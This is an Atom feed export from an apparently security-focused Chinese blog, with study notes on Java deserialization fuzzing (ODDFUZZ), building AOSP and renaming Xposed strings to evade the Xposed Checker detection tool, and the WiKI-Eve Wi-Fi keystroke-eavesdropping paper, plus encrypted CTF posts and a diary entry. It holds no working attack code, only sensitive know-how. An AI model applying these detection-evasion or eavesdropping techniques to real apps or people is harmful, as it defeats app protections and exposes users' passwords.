true，并将随机值分配给参数，这些参数对应于被卡gadget所属类的属性的结构突变，以产生新的输入。</p><p>&emsp;为了说明前向突变，考虑以下参数序列$\sigma_{2}$：</p><p><img src="/images/oddfuzz/image-20231115195815150.png" alt="image-20231115195815150" style="zoom:67%;" /></p><p>&emsp;如上所示，假设有一个注入对象卡在gadget TransformingComparator.compare() 中，fuzzer将其 Identifier 翻转为 true 并改变 TransformingComparator 类对应的参数序列（例如，将实例T分配给属性transformer）。基于这种前向突变策略，fuzzer可以有效地生成更有可能到达sink的输入。</p><p>&emsp;最后，当变异的种子到达sink时，fuzzer将报告给定的gadget链是可以被利用的。</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>&emsp;我们基于流行的 Java 模糊测试平台 JQF 实现了 oddfuzz。我们定制了它的组件，使其适合gadget链模糊测试，同时搭载 JQF 的底层功能，例如运行时检测（<code>tai-e能做到这一点吗？</code>）。</p><p>&emsp;<code>污点分析</code>。 oddfuzz 使用 Soot 来解析 Java 字节码并将其转换为中间语言 Jimple 。基于 Jimple 的基本类信息（例如类修饰符、字段、方法），实现了基于方法摘要的污点分析。</p><p>&emsp;<code>结构化模糊测试</code>。 <code>oddfuzz 修改了 JQF 中内置的 junit-quickcheck 生成器，以根据候选 gadget 链随机生成和变异结构化注入对象，而不是手动编写输入格式的声明性规范（例如上下文无关语法或协议缓冲区）</code>。为了<code>启用和促进结构化感知种子生成，采用 JRE 提供的类 sun.msic.Unsafe</code>，允许用户创建类的实例，而无需调用其构造函数代码、初始化代码、各种 JVM 安全检查和所有其他低层次的东西。</p><p>&emsp;<code>运行时Instrumentation</code>。当 JVM 加载类时，我们使用 ASM 工具包通过 javaagent 动态检测 Java 字节码。当测试程序 PUT 启动时，oddfuzz 工具会注入一个静态方法调用，该调用在每次调用或跳转指令后执行，<code>以跟踪注入对象的执行</code>。出于效率考虑，检测仅限于与gadget链相关的字节码，而不是整个程序。</p><p>&emsp;<code>反馈收集</code>。对于覆盖率信息，我们对 JQF 进行了最小的修改，通过跳转指令检测每个基本块，来收集branch覆盖率。对于距离信息，oddfuzz 基于 ASM 在字节码级别生成相应的 gadget 链的过程内控制流图（CFG）。 CFG的根节点（即gadget）由方法签名来标识，而其他CFG节点则由相应基本块的跳转指令来标识。当将 gadget 链送到fuzzer进行验证时，oddfuzz 距离计算器会根据 gadget 链的调用顺序和生成的 CFG 计算每个基本块到sink的过程间距离。距离计算器是用 JGraphT 库实现的。</p><p>To be continued…</p><h2 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h2><h2 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h2><h2 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h2><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ODDFUZZ-Discovering-Java-Deserialization-Vulnerabilities-via-Structure-Aware-Directed-Greybox-Fuzzing&quot;&gt;&lt;a href=&quot;#ODDFUZZ-Discovering-Java-Deserialization-Vulnerabilities-via-Structure-Aware-Directed-Greybox-Fuzzing&quot; class=&quot;headerlink&quot; title=&quot;ODDFUZZ: Discovering Java Deserialization Vulnerabilities via Structure-Aware Directed Greybox Fuzzing&quot;&gt;&lt;/a&gt;ODDFUZZ: Discovering Java Deserialization Vulnerabilities via Structure-Aware Directed Greybox Fuzzing&lt;/h1&gt;&lt;h2 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerlink&quot; title=&quot;摘要&quot;&gt;&lt;/a&gt;摘要&lt;/h2&gt;&lt;p&gt;&amp;emsp;可以用静态分析来定位java反序列化漏洞。ODDFUZZ使用轻量级污点分析定位候选的gadget链（避免漏报），之后使用定向灰盒测试生成poc用例来减少误报。ODDFUZZ使用结构感知种子生成方法保证用例有效性，并使用混合反馈与步进策略来指导定向模糊测试。&lt;/p&gt;</summary>
    
    
    
    <category term="papers" scheme="https://wd-2711.tech/categories/papers/"/>
    
    
  </entry>
  
  <entry>
    <title>blog-migrate-test</title>
    <link href="https://wd-2711.tech/2023/11/03/blog-migrate-test/"/>
    <id>https://wd-2711.tech/2023/11/03/blog-migrate-test/</id>
    <published>2023-11-03T11:46:36.000Z</published>
    <updated>2023-11-06T12:45:46.071Z</updated>
    
    <content type="html"><![CDATA[<h1 id="博客迁移日志"><a href="#博客迁移日志" class="headerlink" title="博客迁移日志"></a>博客迁移日志</h1><p>test</p><span id="more"></span><p><img src="/images/blog-migrate-test/image-20231106203331118.png" alt="image-20231106203331118" style="zoom:67%;" /></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;博客迁移日志&quot;&gt;&lt;a href=&quot;#博客迁移日志&quot; class=&quot;headerlink&quot; title=&quot;博客迁移日志&quot;&gt;&lt;/a&gt;博客迁移日志&lt;/h1&gt;&lt;p&gt;test&lt;/p&gt;</summary>
    
    
    
    <category term="杂记" scheme="https://wd-2711.tech/categories/%E6%9D%82%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>ACTF-2023</title>
    <link href="https://wd-2711.tech/2023/10/29/ACTF-2023/"/>
    <id>https://wd-2711.tech/2023/10/29/ACTF-2023/</id>
    <published>2023-10-29T07:27:19.000Z</published>
    <updated>2023-11-03T11:45:43.106Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d9b3a03e3e153d036277dc89aa77374bc1b84efeb0c015576d6d883ec5019b81"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="re" scheme="https://wd-2711.tech/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>frida-reverse-analysis-3</title>
    <link href="https://wd-2711.tech/2023/10/22/frida-reverse-analysis-3/"/>
    <id>https://wd-2711.tech/2023/10/22/frida-reverse-analysis-3/</id>
    <published>2023-10-22T08:58:01.000Z</published>
    <updated>2023-12-24T12:08:40.953Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Frida逆向与协议分析-3"><a href="#Frida逆向与协议分析-3" class="headerlink" title="Frida逆向与协议分析-3"></a>Frida逆向与协议分析-3</h1><p>&emsp;frida逆向与协议分析第三部分，主要就是Android源码编译、沙箱等。</p><span id="more"></span><h2 id="0x05-Android源码编译与Xposed魔改"><a href="#0x05-Android源码编译与Xposed魔改" class="headerlink" title="0x05 Android源码编译与Xposed魔改"></a>0x05 Android源码编译与Xposed魔改</h2><p>&emsp;市面上绝大多数app都会对xposed框架进行特征检测，绕过的思路就是找到检测点（java层或者native层），然后hook修改返回结果，或者以硬编码、置零等方式来绕过检测逻辑。但是检测点很难找到（代码太多，或者以ollvm、vmp加固）。</p><p>&emsp;一个绝杀点就是：在源头消灭xposed特征，让你检测不到。本章就介绍如何魔改编译魔改xposed，从而绕过开源xposed检测工具Xposed Checker。</p><h3 id="Android源码环境搭建"><a href="#Android源码环境搭建" class="headerlink" title="Android源码环境搭建"></a>Android源码环境搭建</h3><p>&emsp;为什么要编译Android源码？Xposed源码不就得了。这是因为Xposed的编译过程很依赖android的源码，因此，我们先对android源码进行编译。（需要12G运存+450G硬盘，电脑办不了，只能组装了）</p><hr><p>&emsp;由于安卓源码引用了外部开源工具，例如OpenSSL，每一个子项目都是Git仓库，为了方便的管理这个Git仓库，安卓官方推出了相关的管理工具，名为repo。Repo封装了一系列的Git指令，可以方便的对多个Git仓库进行管理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir aosp712_r8 &amp;&amp; cd aosp712_r8</span><br><span class="line">repo init -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-7.1.2_r8</span><br><span class="line">repo sync</span><br></pre></td></tr></table></figure><p>&emsp;<code>repo sync</code>只是下载了系统运行必须的代码，只能编译出运行Android Emulator（模拟器）的虚拟机系统，要是想让此系统安装到设备中，还需要下载设备对应的驱动（作用是在物理机系统上起到协调上层系统与底层硬件的通信）。</p><p>&emsp;编译完成后，编译出来的镜像是不全的，还需要下载BootLoader等关键的系统镜像，之后即可刷上自编译系统。</p><h3 id="Xposed定制"><a href="#Xposed定制" class="headerlink" title="Xposed定制"></a>Xposed定制</h3><div class="table-container"><table><thead><tr><th>模块</th><th>功能</th></tr></thead><tbody><tr><td>XposedInstaller</td><td>用于下载和安装Xposed.zip刷机包。</td></tr><tr><td>XposedBridge</td><td>java层的API提供者，调用Xposed相关的API时，首先调用XposedBridge中的函数，之后转发到Native方法。</td></tr><tr><td>Xposed</td><td>位于Native层的Xposed实际实现，是对Zygote的二次开发。</td></tr><tr><td>android_art</td><td>对art的二次开发，以提供对Xposed的支持。</td></tr><tr><td>XposedTools</td><td>负责编译和打包刷机的ZIP包。</td></tr></tbody></table></div><p>&emsp;就是，将XposedInstaller安装到设备之后，XposedInstaller会下载由XposedTools打包的含有XposedBridge，Xposed，android_art的ZIP包，并将此ZIP包刷入到系统（放置与替换系统文件）。</p><p>&emsp;Xposed包的编译过程见书P137。</p><p>&emsp;之后，使用XposedChecker检测Xposed模块。其中有很多不同的检测项，例如：</p><p>（1）<code>载入Xposed工具类</code>检测项，是通过使用系统类加载器加载XposedHelper类，如果可以加载那么说明此系统中是有Xposed模块的。</p><p>（2）<code>寻找特征动态链接库</code>检测项，是通过查看<code>/proc/self/maps</code>文件，其中如果有XposedBridge字符串，那么说明此系统中有Xposed模块。</p><p>（3）<code>检测Xposed安装情况</code>检测项，是查看系统中已安装的App列表是否包含Xposed相关的App。</p><p>（4）<code>环境变量特征字判断</code>检测项，通过获得环境变量，查看环境变量中是否有XposedBridge。</p><p>&emsp;可以发现，大多数Xposed的特征都是字符串特征，所以可将Xposed检测字符串的点修改为其它字符串。步骤如下：</p><p>&emsp;(1)修改XposedInstaller App的Xposed字符串特征，即修改整体包名以及prop配置文件相关字符串。根据书P144，可以修改所有<code>xposed</code>字符串变为<code>xppsed</code>，之后，修改配置文件与字符串硬编码的字符，例如<code>AndroidManifest.xml</code>，这里不再赘述，详见书P145左右。</p><p>&emsp;(2) 根据 (1) 的步骤修改XposedBridge，最终制作出XppsedBridge.jar。</p><p>&emsp;(3) 修改Xposed项目源代码，详见书P147。</p><p>&emsp;(4) 修改XposedTools工具的源码，保证编译过程中不报错。</p><h3 id="相关知识补充"><a href="#相关知识补充" class="headerlink" title="相关知识补充"></a>相关知识补充</h3><p>&emsp;见<a href="https://bbs.kanxue.com/thread-269627.htm#msg_header_h2_1">link</a>。</p><p>&emsp;</p><h2 id="0x06-Android沙箱之加解密库“自吐”"><a href="#0x06-Android沙箱之加解密库“自吐”" class="headerlink" title="0x06 Android沙箱之加解密库“自吐”"></a>0x06 Android沙箱之加解密库“自吐”</h2><h2 id="0x07-Android沙箱开发之网络库与系统库“自吐”"><a href="#0x07-Android沙箱开发之网络库与系统库“自吐”" class="headerlink" title="0x07 Android沙箱开发之网络库与系统库“自吐”"></a>0x07 Android沙箱开发之网络库与系统库“自吐”</h2><h2 id="0x08-收费直播间逆向分析"><a href="#0x08-收费直播间逆向分析" class="headerlink" title="0x08 收费直播间逆向分析"></a>0x08 收费直播间逆向分析</h2><h2 id="0x09-会员制非法应用破解"><a href="#0x09-会员制非法应用破解" class="headerlink" title="0x09 会员制非法应用破解"></a>0x09 会员制非法应用破解</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Frida逆向与协议分析-3&quot;&gt;&lt;a href=&quot;#Frida逆向与协议分析-3&quot; class=&quot;headerlink&quot; title=&quot;Frida逆向与协议分析-3&quot;&gt;&lt;/a&gt;Frida逆向与协议分析-3&lt;/h1&gt;&lt;p&gt;&amp;emsp;frida逆向与协议分析第三部分，主要就是Android源码编译、沙箱等。&lt;/p&gt;</summary>
    
    
    
    <category term="re-book" scheme="https://wd-2711.tech/categories/re-book/"/>
    
    
  </entry>
  
  <entry>
    <title>N1CTF-2023</title>
    <link href="https://wd-2711.tech/2023/10/21/N1CTF-2023/"/>
    <id>https://wd-2711.tech/2023/10/21/N1CTF-2023/</id>
    <published>2023-10-21T03:07:00.000Z</published>
    <updated>2023-10-22T08:45:40.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4291535d607e769a7f44db08ecf171aff5e82cf5e1a6dbac4a0d43e7e1288c4d">2c151d14a1692af99fa0c574696ab642630118ededbcd92b05c804024ee0b0d51c56116b5bab9e45baeea968e6dd944707ea6a5b481faee30b12db312aeff2b8fe1dc3fec9baba996efd048c6df6dbe1a80138920fb6b0f49839787021eb0efa144c03367e825fbffae3fd9ac8691c0aa3512b16833eae95b678fd5347ce40a22b6b7c92bc492671f01da6a3cbfc8def34719437efdf420f92dca41c3db9c9349861e5f07743d66d58832a512caf3983a29a212f80f03b2fe8ab117840b6b877bf40c62014bb4715e7ad9cb9029202a0a44fcec52b9add24865ece6ea75a99d373b083dbe3da5629e96ae13c8194b16df05987085b9bb184d6ef9e60b06e8a895a84cb48a936a6e0b4c52d829613143a1268ebd4317c066f8f4ca49ae861ab31c6231f00649891399c0ab9543043f7470ba598f2c5fe48754a19ce7a6d785003378104c1c8b24c93a20a081345488565ab5ce853b248db1811ce6156a29415c61ce387a35fa7d9736bb4bfa7feea8c1aa58cca0ee79340b1998c52697f06a4d6f4d969ca85968121f346a5e549933a80d01709c330318d3862b71f87a09f017429364c2fb86c0b67ad75347b69931482ed5a79f8ec28e2f164922878be3c2e6d2b080181fb5c18a5cfe9a23e42c0d0e3338494c73c2558c50036b01dec861a40949010f388096656999be852f946eff617ce3cb60b92ca73c3e6cfc55fdfae298ab3aa2f51138fe3a14fa26245742fc4dcec6fa8758bd9882bc2a4bf8db6e63d05d8d9050b565ee045278090044ec210b5d5d2f53f52172cef856656a0cbcd9f3c7fc452fde7b83c52450a296ea9c6db46ea741d2e66b2bf49771e1764c63c74f5ec3a2b3f7fb87d98f6369f7e10baa2132801f030708d79b8408f3470658d3f2d441a9e0386ed120792266ad0fcf8006e21d59a3680f543a7454a34c56de48f05be00717568316ef73b01f7d11049ac7bb43cdd37cdc58ef598862772e778381382ca32032e07c172e1b18bb7ff2846aa31300ed8d1ebed03ef3901c0aed5c39b4b09be541c0bdde84d821abb051c39131f49b46b61f93cd2d2d6011d32926a2c433abcaed7f8793c988b19230de840e9a594ef7e6c179722d2b3248533e54aa7bac217f478e9c5ca15037bebb8100639334476520e7267013b6ebb99f6c439d3c9d328ebadeffc5a1081526396e262f5acabd4c1854792b2ff17b088bd4d526feab3545cf55f2126a38b5293193fc90c47d0c344f270b748867dc76d615f83ea27ec85b14311e3462861ed0a2f084ba6e4b3f712c4978f71a06d6be25309ba916cbfe8061e08dee6ac4c5d0325ed9c5b3be98a4752b146b263d09044c854746f6b53d80ecfa894da1d275b56fb405a6f2279a4b95a992af09448d47e84494ae84f002ab2fa8d60dba997bd665a557088401b8d7ee9222573600901be9062de8a66aa54c6c71e1475c8a47d5f64b8c75b07eeb96776862660a81beba2c440426f64cbef8ee523526424f5bb9b38706e6056b487e5c1afd6e73a6bde5f7bddf4c7c279748b150942df702318811ca3f59ab96c8797b8d4561b20da56c6490e7273ad6e5ec9dc000a7784be0a621b594d90563cdfdb862f8e88b0edff1bb78951e13c52937aaaa9f84e027508a270d5ab050b252951aebc8fd5eb6583d2a4e9e0db13cf3cb53ab55fd4218606eeff5db03073be9e9ad393dbd41dc2233ad1815ba918510a9a91892ed1f31c238c3622a82c78aa62463de144abc3c923f5abf8206e9295f179884168287c18e34954c4931b873c8309e28e2350631af432785e29c67748cbba30b3f48cd376ea874cb9ee35938a79e7bbbe0f61574d06012313547a708694cfff96340d3eb381feded2d7b22b924272e80a92b92e5b1fc215cdcc1c284d7da1b9ffd0e4f9a439b91e5f989aa01dd430bfa29f4749e162e73e5580612402fc68cf7bbd5cf1970c5d606093870abd76e8bfb242bdd9c90ffee936f655e824511e6bdf2ae4210c7687c63436968bed4e6d9c1641d33f64507629943b17e85943000d1bbc9482d7872bfe78838c02075bd84617c0f5b4b343f877f887aa9b3eeddb237134a2c36b0011bf65c7f1c2e3d562c97d22cbb679577f63a6d60d29284d08c6349d7244cd7646b74efd294b1b45dcba1ce49e70a6e2902346e4dc217e9eb5baa5061e228760ec64e5af52a649853bf01751c65468d0f372371d961be9a74294838c7165d1f8cfe967b7a5f245a999eced9e619683a78b1de75c20f6460f6edf11e44194fbf40d66508ce97d258cddad89a77e329cce04aa9e362deb32e3959734ad74ae59376134552d64439438e5d9153227a54b5959df1e78a83b67be384630e1b647eb503a4728347b471e3ebac660cec35d0953a83b9682efad5a0177768232e2fe69ccc81debd9a978fa499d2ca621d9ffbff489d73c9d0c80e8c46f19cd5afeaca71ae2a09e2b2766f7f03c496610a498761e3bb56668a0426b1ef88a413ef8a6d8730f2a26ff6b182d21339f6d1e0d1b6a67d3fd7c3c00cd044ad8043961b5f9adf27140c639404d606c8e2aee3a47cf195dfd5d8d35cc5e8ed5a73fa13ad0a2474e3b406b04db69f1d4227e8c02d26dd51c52bb3380e5bd232279b3c65c90a279d819c120da91a528fe0e5406a2e1c7db28588d856f0c812dcb480cd25ee1f05bee5255e7640f7c80fd49b3324e99246483e8637cf6755bb1897dcb4618084e06d8c6b3f0239c2b6f45bf1c7add1f91caa6f1b0e4cfceaa3b4eb8ca0e6e1f38e3fb976e6361c9f562e9911085881610df12c0beb20e94938937e62292e3ecdeb6ed896a3ddff1e2a864b091fc267faf2c60d6b5a154feaabed14468d2e8d60d37ef3a6875c40c224f4027466b4daf40258335e5ae5cd7a2348ff2c37f46248123bcd895265e7988c1c6589376348396ed5c8f7a50087b3a3b5b84bf848dcae25e3b4f314e3336f23dcd95abf96e8970757170854b90da421682fe6055bb2266dfc7603630b7f663f50567aa68c3bf5f4e5651b8e49c8f93e80fbc14edce47e85e1c02519e02a8aa2f55b1f9345a8d1eafb40fc0756cdc99b8400f3b799d2482ddfadef6ca7c41027b42880f75733ee52a2a7e5a6f688e9dfd0cb3d03285d676f49e328505444b5cf60ad742aa9bcda3a051d2acb4ad125aa7f7e21cf6b62ab5493b2594711c68eebc4d15d3c7f2177dbad2c7fb9a29e545f09362626a788dd8fd3ba78bec559257e815fd30648799a7d8d189a428f427296396dc6359478bb3d909215ebef4c815592ddbcb9a595ec223c50e28b613fd9c4b344b7e9cba6f941752037af843e60e2a704006ab5a50b02001bd7b4824d2b8cabd1f943f90ee9de894ecef96ad457ec0a429951cee9581087aba6244ca1f7f222f08e411f200427f818c36f1da422e10e67f135cbc4d456772dc5bc4b03e230e40848cdae03554f159e320f5a24d8a9d7382ceace84cce209bb48c0c94c99f842e29faee9049851300c89d4d3755b857c7f9f592040c2b26bf64b7293767670c6f770569122f2dee7940cd851a651be2f43f18e924901daf37818d2867b4e4c2f1eac7be880161d78baa528ca2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="re" scheme="https://wd-2711.tech/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>recentlyThink-4</title>
    <link href="https://wd-2711.tech/2023/10/19/recentlyThink-4/"/>
    <id>https://wd-2711.tech/2023/10/19/recentlyThink-4/</id>
    <published>2023-10-18T16:03:40.000Z</published>
    <updated>2023-10-19T05:34:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="最近"><a href="#最近" class="headerlink" title="最近"></a>最近</h1><p>&emsp;最近的生活就是一直在跟着计划走，虽然从来没按时完成过hhh。十月一之前一直期盼着假期到来，因为坤哥辉哥旭哥假期说找我玩，然后我们计划着租车围着巢湖转几天。最后其实假期还挺好的，一共一块玩了5天，第一天是租了个2室1厅的民宿。第二天去了风之谷自然农场：</p><span id="more"></span><p><img src="/images/recentlyThink-4/image-20231019130502196.png" alt="image-20231019130502196" style="zoom:67%;" /></p><p>&emsp;浮桥很舒服，草地也很舒服，只不过没有足够的钱住在这里（一晚1800）。后面几天就是车展、园博园各种旅游地。</p><p>&emsp;假期的时候我们四个人都很省，舍不得花钱，可能是他们三个工作了，也要成家立业了。有时候也真的挺感慨的，从前那种无忧无虑的生活再也没了，从前虽然很穷，手里只有几十块钱，也不会担心。附一张十几年前游玩图（图中为坤哥）：</p><p><img src="/images/recentlyThink-4/image-20231019131216881.png" alt="image-20231019131216881" style="zoom:67%;" /></p><p>&emsp;现在更多的想法是如何赚更多的钱，让自己在出去玩时更快乐。但是有了钱，真的能让自己更快乐么？豪车美酒，难道不会更会让自己更空虚么？我也不知道答案。</p><p><img src="/images/recentlyThink-4/image-20231019131436147.png" alt="image-20231019131436147" style="zoom:67%;" /></p><p>&emsp;说回正题，国庆回来之后，我的学习状态感觉就不是很好，拿到ms的实习之后，愈发感觉自己有点飘了。此时是焦虑与飘的结合体，焦虑是愁论文怎么发，飘是觉得自己行了。其实想想，拿到这个机会更多的只是运气。</p><p>&emsp;最近也发现自己有好多不足，一是逆向做的题不够，见的不够广。二是眼高手低，无法静心。三是没有毅力，减肥喊了好多天了，昨天还去吃了牛排自助…</p><p>&emsp;针对一，我觉得还是得把攻防世界的题目刷起来；针对二，更多的得是自己要意识到，学无止境；三是通过吃一顿饭就给猪猪转50块钱的方式，引入外部约束力。</p><p>&emsp;<code>莫图虚名修术业，勿以浮沙筑高台</code>。希望要时刻提醒自己这一点。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;最近&quot;&gt;&lt;a href=&quot;#最近&quot; class=&quot;headerlink&quot; title=&quot;最近&quot;&gt;&lt;/a&gt;最近&lt;/h1&gt;&lt;p&gt;&amp;emsp;最近的生活就是一直在跟着计划走，虽然从来没按时完成过hhh。十月一之前一直期盼着假期到来，因为坤哥辉哥旭哥假期说找我玩，然后我们计划着租车围着巢湖转几天。最后其实假期还挺好的，一共一块玩了5天，第一天是租了个2室1厅的民宿。第二天去了风之谷自然农场：&lt;/p&gt;</summary>
    
    
    
    <category term="杂记" scheme="https://wd-2711.tech/categories/%E6%9D%82%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Password-Stealing-without-Hacking</title>
    <link href="https://wd-2711.tech/2023/10/18/Password-Stealing-without-Hacking/"/>
    <id>https://wd-2711.tech/2023/10/18/Password-Stealing-without-Hacking/</id>
    <published>2023-10-18T06:17:03.000Z</published>
    <updated>2023-10-19T04:41:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WiKI-Eve-Wi-Fi-Enabled-Practical-Keystroke-Eavesdropping"><a href="#WiKI-Eve-Wi-Fi-Enabled-Practical-Keystroke-Eavesdropping" class="headerlink" title="WiKI-Eve:Wi-Fi Enabled Practical Keystroke Eavesdropping"></a>WiKI-Eve:Wi-Fi Enabled Practical Keystroke Eavesdropping</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>&emsp;Wi-Fi 的非接触式特性可以泄露隐私，但针对 Wi-Fi CSI（信道状态信息）的攻击需要攻击 Wi-Fi 硬件，这非常困难。为此，我们提出了 WiKI-Eve 技术，无需攻击即可<code>窃听智能手机上的按键操作</code>。 WiKI-Eve 利用了 Wi-Fi 硬件提供的 BFI（波束成形反馈信息）功能：<code>由于 BFI 以明文形式从智能手机传输到 AP（路由器），因此它可以被切换到监听模式的 Wi-Fi 设备偷听</code>。WiKI-Eve 还创新了对抗性学习方案，使其推理能够泛化到未见过的场景。结果表明，WiKI-Eve 对单个击键的推理准确率达到 88.9%，对窃取移动应用程序（例如微信）密码的准确率高达 65.8%。</p><p>&emsp;没找到代码呜呜…</p><span id="more"></span><h2 id="本文贡献"><a href="#本文贡献" class="headerlink" title="本文贡献"></a>本文贡献</h2><p>&emsp;当前窃取手机密码需要好多前提：（1）窃听设备靠近受害设备；（2）流氓软件被植入受害设备；（3）窃听内容具有语言结构。</p><p>&emsp;在所有侧信道中，Wi-Fi CSI（信道状态信息）似乎无需上述前提。 本质上，由于击键会影响无线通道（如下图所示），因此可推断输入的密码。 </p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018150244446.png" alt="image-20231018150244446" style="zoom:67%;" /></p><p>&emsp;但是，尽管 CSI 很早就被 Wi-Fi 硬件黑客攻击，但到目前为止，<code>只有少数此类硬件被黑客攻击，而 Wi-Fi 标准却在不断变化</code>。因此，基于 CSI 的旁道攻击无法跟上技术的发展。</p><p>&emsp;从 WiFi 5 开始，WiFi 硬件搭载了 BFI（波束成形反馈信息），即模拟 CSI 的压缩数字版本，其以明文形式控制帧。<code>BFI 将下行链路信道状态反馈回接入点 (AP)，以指导 AP 波束成形（AP信号指向移动设备，从而使得信号更好）</code>。尽管只考虑了与 AP 侧有关的下行链路 CSI 的一部分，但击键可影响 Wi-Fi 天线，使得 BFI 包含有关击键的足够信息。因此，任何能够监听 Wi-Fi 流量的设备都可以免费获得 BFI，从而获得击键。</p><p>&emsp;但是，我们要解决两个问题：（1）密码缺乏自然语言中的语言结构（例如单词结构和字母出现频率）来作为先验信息，因此，密码推断要么依赖于独立的击键特征，要么利用两次击键之间的转换特征。但是，<code>这些特征具有很强的环境依赖性，由此推理方法很难泛化</code>。尽管监督学习技术可以通过包含足够训练数据的数据集来解决此问题，但由于智能手机型号多样化和人类打字习惯，标记数据集非常困难。（2） BFI 可能是稀疏的，即在信号中很少出现 BFI。</p><p>&emsp; WiKI-Eve 通过窃听按键引起的 <code>BFI 变化</code>来窃取密码。针对问题（1），使用识别单个击键的方法，<code>利用具有自然分割为输入的深度学习模型来以消除基于规则的分割和环境干扰引入的噪声，利用对抗性学习来提取单个击键相关的特征</code>。这种跨域训练利用<code>有限的训练数据将击键推理泛化</code>。针对问题（2），设计了稀疏恢复算法来解决数据不足问题。本文贡献如下：</p><ul><li>利用明文 BFI，利用 Wi-Fi 设备窃听密码。</li><li>利用对抗性学习来消除环境依赖性，使 WiKI-Eve 的模型可推广到未见过的场景。</li><li>稀疏恢复算法来解决BFI的稀疏性问题，处理训练击键推理模型时的数据缺乏问题。</li></ul><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="攻击场景及方式"><a href="#攻击场景及方式" class="headerlink" title="攻击场景及方式"></a>攻击场景及方式</h3><p>&emsp;我们考虑这样一种场景：受害者 Bob 使用他的移动设备连接到没有密码保护的 Wi-Fi 接入点 (AP)， Bob连接到AP上网后，需要访问受密码保护的敏感账户（例如在线支付），这使得他成为Eve发起的攻击目标。 从这里开始，我们的方法与现有的方法不同，现有的方法要么需要恶意 AP 来欺骗 Bob 使用其服务，要么需要设置额外的 Wi-Fi 通信链接来窃取Bob 的打字。</p><p>&emsp;WiKI-Eve 的攻击方法利用配备网络接口卡 (NIC) 的笔记本电脑。其中，Bob 和 AP 之间的 Wi-Fi 链路（CSI）被用来窃取密码，如下图 (a) 所示，WiKI-Eve 进行了创新，将我们的方法称为 o-IKI（无意中窃听带内击键推理），不再需要破解 Wi-Fi NIC 并欺骗 Bob 将其用作 AP。 </p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018161212127.png" alt="image-20231018161212127" style="zoom:67%;" /></p><p>&emsp;另一种方法称为带外击键推理 (OKI)，如上图 (b) 所示，要求 Eve 使用 Wi-Fi NIC 和另一个设备（例如 AP）创建一个与 Bob 无关的单独通道，Eve 通过观察该通道的 CSI 来推断 Bob 的击键。<code>与依赖模拟 CSI 的 OKI 相比，o-IKI 窃听 BFI 的数字特性有更大的传感范围，而击键推理 KI 的带内传感则确保了足够高的信噪比（SNR）</code>。与 IKI 让 Eve 通过其恶意 AP 直接观察数据流量不同，o-IKI 和 OKI 要求 Eve 能够识别 Bob 的设备，而这在 OKI 下很难实现。</p><h3 id="为什么选择-BFI？"><a href="#为什么选择-BFI？" class="headerlink" title="为什么选择 BFI？"></a>为什么选择 BFI？</h3><p>（1）BFI 易于获取。</p><p>（2）BFI 对通道变化的敏感度低于 CSI，使得传感结果更加稳定，尤其是 IKI 对 Wi-Fi 通道的密切影响（来自屏幕上的击键）。这种稳定性源于 BFI 的生成方式，给定下行链路 CSI 表示为 $H = Y/X$，其中 $X$ 和 $Y$ 分别表示发送 (Tx) 和接收 (Rx) 信号，BFI 是通过将 H（它代表的信道）划分为单独的 Tx 和 Rx 组件，仅 Tx 分量反馈至 AP 以指导 AP 波束成形。由于这种通道分割，BFI 不太容易受到 IKI 屏幕上按键引起的通道变化的影响，否则会导致支持 CSI 的 KI 中出现明显的歧义。</p><p>&emsp;为了验证上述原因，利用 iPerf 生成饱和流量并仅收集原始 BFI 和 CSI 样本，下图显示了单击四个不同键的 BFI 